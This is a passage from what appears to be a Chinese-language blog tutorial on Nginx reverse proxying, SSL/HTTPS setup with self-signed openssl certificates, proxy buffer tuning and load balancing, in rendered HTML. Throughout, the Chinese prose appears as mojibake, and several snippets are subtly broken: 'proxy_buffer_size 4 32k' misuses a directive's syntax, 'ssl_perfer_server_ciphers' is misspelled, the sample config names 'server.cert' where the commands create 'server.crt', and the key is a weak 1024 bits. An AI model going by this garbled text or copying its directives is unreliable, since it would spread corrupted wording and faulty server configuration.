 /win &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#39033    </span><br>    <span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">39033</span>;<br>        <span class="hljs-attribute">server_name</span>  linux.nginx;<br>        <br>        <span class="hljs-section">location</span>  /win/ &#123;<br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/win/(.*)$</span> /<span class="hljs-variable">$1</span> <span class="hljs-literal">break</span>;<br>            <span class="hljs-attribute">proxy_pass</span>   http://192.168.23.1:80/;<br>        &#125;  <br>    &#125;<br><span class="hljs-comment">#ä»¥ä¸ºä»£ç†ä¹‹åçš„rulåˆ†åˆ«ä¸º </span><br><span class="hljs-comment">#/win</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br><span class="hljs-comment">#/</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185134045.png" alt="image-20230118185134045" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185155031.png" alt="image-20230118185155031" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185238480.png" alt="image-20230118185238480" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185232165.png" alt="image-20230118185232165" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230118185302983.png" alt="image-20230118185302983" /></p><p>â€‹</p></li></ol><h2 id="nginxçš„å®‰å…¨æ§åˆ¶"><a class="markdownIt-Anchor" href="#nginxçš„å®‰å…¨æ§åˆ¶"></a> Nginxçš„å®‰å…¨æ§åˆ¶</h2><p>å…³äºwebæœåŠ¡å™¨çš„å®‰å…¨æ˜¯æ¯”è¾ƒå¤§çš„ä¸€ä¸ªè¯é¢˜ï¼Œé‡Œé¢æ‰€æ¶‰åŠçš„å†…å®¹å¾ˆå¤šï¼ŒNginxåå‘ä»£ç†æ˜¯å¦‚ä½•æ¥æå‡webæœåŠ¡å™¨çš„å®‰å…¨å‘¢ï¼Ÿ</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">å®‰å…¨éš”ç¦»<br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆæ˜¯å®‰å…¨éš”ç¦»?</p><p>é€šè¿‡ä»£ç†åˆ†å¼€äº†å®¢æˆ·ç«¯åˆ°åº”ç”¨ç¨‹åºæœåŠ¡å™¨ç«¯çš„è¿æ¥ï¼Œå®ç°äº†å®‰å…¨æªæ–½ã€‚åœ¨åå‘ä»£ç†ä¹‹å‰è®¾ç½®é˜²ç«å¢™ï¼Œä»…ç•™ä¸€ä¸ªå…¥å£ä¾›ä»£ç†æœåŠ¡å™¨è®¿é—®ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589908851340.png" alt="1589908851340" /></p><h3 id="å¦‚ä½•ä½¿ç”¨sslå¯¹æµé‡è¿›è¡ŒåŠ å¯†"><a class="markdownIt-Anchor" href="#å¦‚ä½•ä½¿ç”¨sslå¯¹æµé‡è¿›è¡ŒåŠ å¯†"></a> å¦‚ä½•ä½¿ç”¨SSLå¯¹æµé‡è¿›è¡ŒåŠ å¯†</h3><p>ç¿»è¯‘æˆå¤§å®¶èƒ½ç†Ÿæ‚‰çš„è¯´æ³•å°±æ˜¯å°†æˆ‘ä»¬å¸¸ç”¨çš„httpè¯·æ±‚è½¬å˜æˆhttpsè¯·æ±‚ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªä¹‹é—´çš„åŒºåˆ«ç®€å•çš„æ¥è¯´ä¸¤ä¸ªéƒ½æ˜¯HTTPåè®®ï¼Œåªä¸è¿‡httpsæ˜¯èº«æŠ«SSLå¤–å£³çš„http.</p><p>HTTPSæ˜¯ä¸€ç§é€šè¿‡è®¡ç®—æœºç½‘ç»œè¿›è¡Œå®‰å…¨é€šä¿¡çš„ä¼ è¾“åè®®ã€‚å®ƒç»ç”±HTTPè¿›è¡Œé€šä¿¡ï¼Œåˆ©ç”¨SSL/TLSå»ºç«‹å…¨é€šä¿¡ï¼ŒåŠ å¯†æ•°æ®åŒ…ï¼Œç¡®ä¿æ•°æ®çš„å®‰å…¨æ€§ã€‚</p><p>SSL(Secure Sockets Layer)å®‰å…¨å¥—æ¥å±‚</p><p>TLS(Transport Layer Security)ä¼ è¾“å±‚å®‰å…¨</p><p>ä¸Šè¿°è¿™ä¸¤ä¸ªæ˜¯ä¸ºç½‘ç»œé€šä¿¡æä¾›å®‰å…¨åŠæ•°æ®å®Œæ•´æ€§çš„ä¸€ç§å®‰å…¨åè®®ï¼ŒTLSå’ŒSSLåœ¨ä¼ è¾“å±‚å’Œåº”ç”¨å±‚å¯¹ç½‘ç»œè¿æ¥è¿›è¡ŒåŠ å¯†ã€‚</p><p>æ€»ç»“æ¥è¯´ä¸ºä»€ä¹ˆè¦ä½¿ç”¨https:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>åè®®æ˜¯æ˜æ–‡ä¼ è¾“æ•°æ®ï¼Œå­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œè€Œ<span class="hljs-keyword">https</span>æ˜¯åŠ å¯†ä¼ è¾“ï¼Œç›¸å½“äº<span class="hljs-keyword">http</span>+sslï¼Œå¹¶ä¸”å¯ä»¥é˜²æ­¢æµé‡åŠ«æŒã€‚<br></code></pre></td></tr></table></figure><p>Nginxè¦æƒ³ä½¿ç”¨SSLï¼Œéœ€è¦æ»¡è¶³ä¸€ä¸ªæ¡ä»¶å³éœ€è¦æ·»åŠ ä¸€ä¸ªæ¨¡å—<code>--with-http_ssl_module</code>,è€Œè¯¥æ¨¡å—åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­åˆéœ€è¦OpenSSLçš„æ”¯æŒï¼Œè¿™ä¸ªæˆ‘ä»¬ä¹‹å‰å·²ç»å‡†å¤‡å¥½äº†ã€‚</p><h4 id="nginxæ·»åŠ sslçš„æ”¯æŒ"><a class="markdownIt-Anchor" href="#nginxæ·»åŠ sslçš„æ”¯æŒ"></a> nginxæ·»åŠ SSLçš„æ”¯æŒ</h4><p>ï¼ˆ1ï¼‰å®Œæˆ <code>--with-http_ssl_module</code>æ¨¡å—çš„å¢é‡æ·»åŠ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">å°†åŸæœ‰/usr/local/nginx/sbin/nginxè¿›è¡Œå¤‡ä»½</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">æ‹·è´nginxä¹‹å‰çš„é…ç½®ä¿¡æ¯</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">åœ¨nginxçš„å®‰è£…æºç è¿›è¡Œé…ç½®æŒ‡å®šå¯¹åº”æ¨¡å—  ./configure --with-http_ssl_module</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">é€šè¿‡makeæ¨¡æ¿è¿›è¡Œç¼–è¯‘</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">å°†objsä¸‹é¢çš„nginxç§»åŠ¨åˆ°/usr/local/nginx/sbinä¸‹</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">åœ¨æºç ç›®å½•ä¸‹æ‰§è¡Œ  make upgradeè¿›è¡Œå‡çº§ï¼Œè¿™ä¸ªå¯ä»¥å®ç°ä¸åœæœºæ·»åŠ æ–°æ¨¡å—çš„åŠŸèƒ½</span><br></code></pre></td></tr></table></figure><h4 id="nginxçš„sslç›¸å…³æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#nginxçš„sslç›¸å…³æŒ‡ä»¤"></a> Nginxçš„SSLç›¸å…³æŒ‡ä»¤</h4><p>å› ä¸ºåˆšæ‰æˆ‘ä»¬ä»‹ç»è¿‡è¯¥æ¨¡å—çš„æŒ‡ä»¤éƒ½æ˜¯é€šè¿‡ngx_http_ssl_moduleæ¨¡å—æ¥è§£æçš„ã€‚</p><blockquote><p>ssl:è¯¥æŒ‡ä»¤ç”¨æ¥åœ¨æŒ‡å®šçš„æœåŠ¡å™¨å¼€å¯HTTPS,å¯ä»¥ä½¿ç”¨ listen 443 ssl,åé¢è¿™ç§æ–¹å¼æ›´é€šç”¨äº›ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl on | off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>ssl off;</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">443</span> ssl;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>ssl_certificate:ä¸ºå½“å‰è¿™ä¸ªè™šæ‹Ÿä¸»æœºæŒ‡å®šä¸€ä¸ªå¸¦æœ‰PEMæ ¼å¼è¯ä¹¦çš„è¯ä¹¦ã€‚\</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_certificate file;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><blockquote><p>ssl_certificate_key:è¯¥æŒ‡ä»¤ç”¨æ¥æŒ‡å®šPEM secret keyæ–‡ä»¶çš„è·¯å¾„</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_ceritificate_key file;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><blockquote><p>ssl_session_cache:è¯¥æŒ‡ä»¤ç”¨æ¥é…ç½®ç”¨äºSSLä¼šè¯çš„ç¼“å­˜</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_sesion_cache off|none|[builtin[:size]] [shared:name:size]</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>ssl_session_cache none;</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><p>off:ç¦ç”¨ä¼šè¯ç¼“å­˜ï¼Œå®¢æˆ·ç«¯ä¸å¾—é‡å¤ä½¿ç”¨ä¼šè¯</p><p>none:ç¦æ­¢ä½¿ç”¨ä¼šè¯ç¼“å­˜ï¼Œå®¢æˆ·ç«¯å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¼šè¯å‚æ•°</p><p>builtin:å†…ç½®OpenSSLç¼“å­˜ï¼Œä»…åœ¨ä¸€ä¸ªå·¥ä½œè¿›ç¨‹ä¸­ä½¿ç”¨ã€‚</p><p>shared:æ‰€æœ‰å·¥ä½œè¿›ç¨‹ä¹‹é—´å…±äº«ç¼“å­˜ï¼Œç¼“å­˜çš„ç›¸å…³ä¿¡æ¯ç”¨nameå’Œsizeæ¥æŒ‡å®š</p><blockquote><p>ssl_session_timeoutï¼šå¼€å¯SSLä¼šè¯åŠŸèƒ½åï¼Œè®¾ç½®å®¢æˆ·ç«¯èƒ½å¤Ÿåå¤ä½¿ç”¨å‚¨å­˜åœ¨ç¼“å­˜ä¸­çš„ä¼šè¯å‚æ•°æ—¶é—´ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_session_timeout time;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>ssl_session_timeout 5m;</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><blockquote><p>ssl_ciphers:æŒ‡å‡ºå…è®¸çš„å¯†ç ï¼Œå¯†ç æŒ‡å®šä¸ºOpenSSLæ”¯æŒçš„æ ¼å¼</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_ciphers ciphers;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>ssl_ciphers HIGH:!aNULL:!MD5;</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><p>å¯ä»¥ä½¿ç”¨<code>openssl ciphers</code>æŸ¥çœ‹opensslæ”¯æŒçš„æ ¼å¼ã€‚</p><blockquote><p>ssl_prefer_server_ciphersï¼šè¯¥æŒ‡ä»¤æŒ‡å®šæ˜¯å¦æœåŠ¡å™¨å¯†ç ä¼˜å…ˆå®¢æˆ·ç«¯å¯†ç </p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>ssl_perfer_server_ciphers on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>ssl_perfer_server_ciphers off;</td></tr><tr><td>ä½ç½®</td><td>httpã€server</td></tr></tbody></table><h4 id="ç”Ÿæˆè¯ä¹¦"><a class="markdownIt-Anchor" href="#ç”Ÿæˆè¯ä¹¦"></a> ç”Ÿæˆè¯ä¹¦</h4><p>æ–¹å¼ä¸€ï¼šä½¿ç”¨é˜¿é‡Œäº‘/è…¾è®¯äº‘ç­‰ç¬¬ä¸‰æ–¹æœåŠ¡è¿›è¡Œè´­ä¹°ã€‚</p><p>æ–¹å¼äºŒ:ä½¿ç”¨opensslç”Ÿæˆè¯ä¹¦</p><p>å…ˆè¦ç¡®è®¤å½“å‰ç³»ç»Ÿæ˜¯å¦æœ‰å®‰è£…openssl</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">openssl <span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><p>å®‰è£…ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œç”Ÿæˆ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mkdir /root/cert<br>cd /root/cert<br>openssl genrsa -des3 -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key <span class="hljs-number">1024</span><br>openssl req -<span class="hljs-built_in">new</span> -key <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.csr<br>cp <span class="hljs-keyword">server</span>.key <span class="hljs-keyword">server</span>.key.org<br>openssl rsa -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.key.org -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.key<br>openssl x509 -req -days <span class="hljs-number">365</span> -<span class="hljs-keyword">in</span> <span class="hljs-keyword">server</span>.csr -signkey <span class="hljs-keyword">server</span>.key -<span class="hljs-keyword">out</span> <span class="hljs-keyword">server</span>.crt<br></code></pre></td></tr></table></figure><h4 id="å¼€å¯sslå®ä¾‹"><a class="markdownIt-Anchor" href="#å¼€å¯sslå®ä¾‹"></a> å¼€å¯SSLå®ä¾‹</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>       <span class="hljs-number">443</span> ssl;<br>    <span class="hljs-attribute">server_name</span>  localhost;<br><br>    <span class="hljs-attribute">ssl_certificate</span>      server.cert;<br>    <span class="hljs-attribute">ssl_certificate_key</span>  server.key;<br><br>    <span class="hljs-attribute">ssl_session_cache</span>    shared:SSL:<span class="hljs-number">1m</span>;<br>    <span class="hljs-attribute">ssl_session_timeout</span>  <span class="hljs-number">5m</span>;<br><br>    <span class="hljs-attribute">ssl_ciphers</span>  HIGH:!aNULL:!MD5;<br>    <span class="hljs-attribute">ssl_prefer_server_ciphers</span>  <span class="hljs-literal">on</span>;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span>   html;<br>        <span class="hljs-attribute">index</span>  index.html index.htm;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰éªŒè¯</p><h2 id="åå‘ä»£ç†ç³»ç»Ÿè°ƒä¼˜"><a class="markdownIt-Anchor" href="#åå‘ä»£ç†ç³»ç»Ÿè°ƒä¼˜"></a> åå‘ä»£ç†ç³»ç»Ÿè°ƒä¼˜</h2><p>åå‘ä»£ç†å€¼Bufferå’ŒCache</p><p>Bufferç¿»è¯‘è¿‡æ¥æ˜¯&quot;ç¼“å†²&quot;ï¼ŒCacheç¿»è¯‘è¿‡æ¥æ˜¯&quot;ç¼“å­˜&quot;ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581879638569.png" alt="1581879638569" /></p><p>æ€»ç»“ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">ç›¸åŒç‚¹:</span><br>ä¸¤ç§æ–¹å¼éƒ½æ˜¯ç”¨æ¥æä¾›IOååæ•ˆç‡ï¼Œéƒ½æ˜¯ç”¨æ¥æå‡Nginxä»£ç†çš„æ€§èƒ½ã€‚<br><span class="hljs-section">ä¸åŒç‚¹:</span><br>ç¼“å†²ä¸»è¦ç”¨æ¥è§£å†³ä¸åŒè®¾å¤‡ä¹‹é—´æ•°æ®ä¼ é€’é€Ÿåº¦ä¸ä¸€è‡´å¯¼è‡´çš„æ€§èƒ½ä½çš„é—®é¢˜ï¼Œç¼“å†²ä¸­çš„æ•°æ®ä¸€æ—¦æ­¤æ¬¡æ“ä½œå®Œæˆåï¼Œå°±å¯ä»¥åˆ é™¤ã€‚<br>ç¼“å­˜ä¸»è¦æ˜¯å¤‡ä»½ï¼Œå°†è¢«ä»£ç†æœåŠ¡å™¨çš„æ•°æ®ç¼“å­˜ä¸€ä»½åˆ°ä»£ç†æœåŠ¡å™¨ï¼Œè¿™æ ·çš„è¯ï¼Œå®¢æˆ·ç«¯å†æ¬¡è·å–ç›¸åŒæ•°æ®çš„æ—¶å€™ï¼Œå°±åªéœ€è¦ä»ä»£ç†æœåŠ¡å™¨ä¸Šè·å–ï¼Œæ•ˆç‡è¾ƒé«˜ï¼Œç¼“å­˜ä¸­çš„æ•°æ®å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œåªæœ‰æ»¡è¶³ç‰¹å®šæ¡ä»¶æ‰ä¼šåˆ é™¤.<br></code></pre></td></tr></table></figure><p>ï¼ˆ1ï¼‰Proxy Bufferç›¸å…³æŒ‡ä»¤</p><blockquote><p>proxy_buffering :è¯¥æŒ‡ä»¤ç”¨æ¥å¼€å¯æˆ–è€…å…³é—­ä»£ç†æœåŠ¡å™¨çš„ç¼“å†²åŒºï¼›</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_buffering on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_buffering on;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><blockquote><p>proxy_buffers:è¯¥æŒ‡ä»¤ç”¨æ¥æŒ‡å®šå•ä¸ªè¿æ¥ä»ä»£ç†æœåŠ¡å™¨è¯»å–å“åº”çš„ç¼“å­˜åŒºçš„ä¸ªæ•°å’Œå¤§å°ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_buffers number size;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_buffers 8 4k | 8K;(ä¸ç³»ç»Ÿå¹³å°æœ‰å…³)</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>number:ç¼“å†²åŒºçš„ä¸ªæ•°</p><p>size:æ¯ä¸ªç¼“å†²åŒºçš„å¤§å°ï¼Œç¼“å†²åŒºçš„æ€»å¤§å°å°±æ˜¯number*size</p><blockquote><p>proxy_buffer_size:è¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®ä»è¢«ä»£ç†æœåŠ¡å™¨è·å–çš„ç¬¬ä¸€éƒ¨åˆ†å“åº”æ•°æ®çš„å¤§å°ã€‚ä¿æŒä¸proxy_buffersä¸­çš„sizeä¸€è‡´å³å¯ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ›´å°ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_buffer_size size;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_buffer_size 4k | 8k;(ä¸ç³»ç»Ÿå¹³å°æœ‰å…³)</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><blockquote><p>proxy_busy_buffers_sizeï¼šè¯¥æŒ‡ä»¤ç”¨æ¥é™åˆ¶åŒæ—¶å¤„äºBUSYçŠ¶æ€çš„ç¼“å†²æ€»å¤§å°ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_busy_buffers_size size;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_busy_buffers_size 8k|16K;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><blockquote><p>proxy_temp_path:å½“ç¼“å†²åŒºå­˜æ»¡åï¼Œä»æœªè¢«NginxæœåŠ¡å™¨å®Œå…¨æ¥å—ï¼Œå“åº”æ•°æ®å°±ä¼šè¢«ä¸´æ—¶å­˜æ”¾åœ¨ç£ç›˜æ–‡ä»¶ä¸Šï¼Œè¯¥æŒ‡ä»¤è®¾ç½®æ–‡ä»¶è·¯å¾„</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_temp_path  path;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_temp_path proxy_temp;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>æ³¨æ„pathæœ€å¤šè®¾ç½®ä¸‰å±‚ã€‚</p><blockquote><p>proxy_temp_file_write_sizeï¼šè¯¥æŒ‡ä»¤ç”¨æ¥è®¾ç½®ç£ç›˜ä¸Šç¼“å†²æ–‡ä»¶çš„å¤§å°ã€‚</p></blockquote><table><thead><tr><th>è¯­æ³•</th><th>proxy_temp_file_write_size size;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>proxy_temp_file_write_size 8K|16K;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>é€šç”¨ç½‘ç«™çš„é…ç½®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxy_buffering</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">proxy_buffer_size</span> <span class="hljs-number">4</span> <span class="hljs-number">32</span>k;<br><span class="hljs-attribute">proxy_busy_buffers_size</span> <span class="hljs-number">64</span>k;<br><span class="hljs-attribute">proxy_temp_file_write_size</span> <span class="hljs-number">64</span>k;<br></code></pre></td></tr></table></figure><p>æ ¹æ®é¡¹ç›®çš„å…·ä½“å†…å®¹è¿›è¡Œç›¸åº”çš„è°ƒèŠ‚ã€‚</p><h1 id="nginxè´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#nginxè´Ÿè½½å‡è¡¡"></a> Nginxè´Ÿè½½å‡è¡¡</h1><h2 id="è´Ÿè½½å‡è¡¡æ¦‚è¿°"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡æ¦‚è¿°"></a> è´Ÿè½½å‡è¡¡æ¦‚è¿°</h2><p>æ—©æœŸçš„ç½‘ç«™æµé‡å’Œä¸šåŠ¡åŠŸèƒ½éƒ½æ¯”è¾ƒç®€å•ï¼Œå•å°æœåŠ¡å™¨è¶³ä»¥æ»¡è¶³åŸºæœ¬çš„éœ€æ±‚ï¼Œä½†æ˜¯éšç€äº’è”ç½‘çš„å‘å±•ï¼Œä¸šåŠ¡æµé‡è¶Šæ¥è¶Šå¤§å¹¶ä¸”ä¸šåŠ¡é€»è¾‘ä¹Ÿè·Ÿç€è¶Šæ¥è¶Šå¤æ‚ï¼Œå•å°æœåŠ¡å™¨çš„æ€§èƒ½åŠå•ç‚¹æ•…éšœé—®é¢˜å°±å‡¸æ˜¾å‡ºæ¥äº†ï¼Œå› æ­¤éœ€è¦å¤šå°æœåŠ¡å™¨è¿›è¡Œæ€§èƒ½çš„æ°´å¹³æ‰©å±•åŠé¿å…å•ç‚¹æ•…éšœå‡ºç°ã€‚é‚£ä¹ˆå¦‚ä½•å°†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æµé‡åˆ†å‘åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šå‘¢ï¼Ÿ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1591631182469.png" alt="1591631182469" /></p><h2 id="è´Ÿè½½å‡è¡¡çš„åŸç†åŠå¤„ç†æµç¨‹"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡çš„åŸç†åŠå¤„ç†æµç¨‹"></a> è´Ÿè½½å‡è¡¡çš„åŸç†åŠå¤„ç†æµç¨‹</h2><p>ç³»ç»Ÿçš„æ‰©å±•å¯ä»¥åˆ†ä¸ºçºµå‘æ‰©å±•å’Œæ¨ªå‘æ‰©å±•ã€‚</p><p>çºµå‘æ‰©å±•æ˜¯ä»å•æœºçš„è§’åº¦å‡ºå‘ï¼Œé€šè¿‡å¢åŠ ç³»ç»Ÿçš„ç¡¬ä»¶å¤„ç†èƒ½åŠ›æ¥æå‡æœåŠ¡å™¨çš„å¤„ç†èƒ½åŠ›</p><p>æ¨ªå‘æ‰©å±•æ˜¯é€šè¿‡æ·»åŠ æœºå™¨æ¥æ»¡è¶³å¤§å‹ç½‘ç«™æœåŠ¡çš„å¤„ç†èƒ½åŠ›ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1584602513812.png" alt="1584602513812" /></p><p>è¿™é‡Œé¢æ¶‰åŠåˆ°ä¸¤ä¸ªé‡è¦çš„è§’è‰²åˆ†åˆ«æ˜¯&quot;åº”ç”¨é›†ç¾¤&quot;å’Œ&quot;è´Ÿè½½å‡è¡¡å™¨&quot;ã€‚</p><p>åº”ç”¨é›†ç¾¤ï¼šå°†åŒä¸€åº”ç”¨éƒ¨ç½²åˆ°å¤šå°æœºå™¨ä¸Šï¼Œç»„æˆå¤„ç†é›†ç¾¤ï¼Œæ¥æ”¶è´Ÿè½½å‡è¡¡è®¾å¤‡åˆ†å‘çš„è¯·æ±‚ï¼Œè¿›è¡Œå¤„ç†å¹¶è¿”å›å“åº”çš„æ•°æ®ã€‚</p><p>è´Ÿè½½å‡è¡¡å™¨:å°†ç”¨æˆ·è®¿é—®çš„è¯·æ±‚æ ¹æ®å¯¹åº”çš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œåˆ†å‘åˆ°é›†ç¾¤ä¸­çš„ä¸€å°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚</p><h3 id="è´Ÿè½½å‡è¡¡çš„ä½œç”¨"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡çš„ä½œç”¨"></a> è´Ÿè½½å‡è¡¡çš„ä½œç”¨</h3><p>1ã€è§£å†³æœåŠ¡å™¨çš„é«˜å¹¶å‘å‹åŠ›ï¼Œæé«˜åº”ç”¨ç¨‹åºçš„å¤„ç†æ€§èƒ½ã€‚</p><p>2ã€æä¾›æ•…éšœè½¬ç§»ï¼Œå®ç°é«˜å¯ç”¨ã€‚</p><p>3ã€é€šè¿‡æ·»åŠ æˆ–å‡å°‘æœåŠ¡å™¨æ•°é‡ï¼Œå¢å¼ºç½‘ç«™çš„å¯æ‰©å±•æ€§ã€‚</p><p>4ã€åœ¨è´Ÿè½½å‡è¡¡å™¨ä¸Šè¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥æé«˜ç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</p><h2 id="è´Ÿè½½å‡è¡¡å¸¸ç”¨çš„å¤„ç†æ–¹å¼"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡å¸¸ç”¨çš„å¤„ç†æ–¹å¼"></a> è´Ÿè½½å‡è¡¡å¸¸ç”¨çš„å¤„ç†æ–¹å¼</h2><h4 id="æ–¹å¼ä¸€ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©"><a class="markdownIt-Anchor" href="#æ–¹å¼ä¸€ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©"></a> 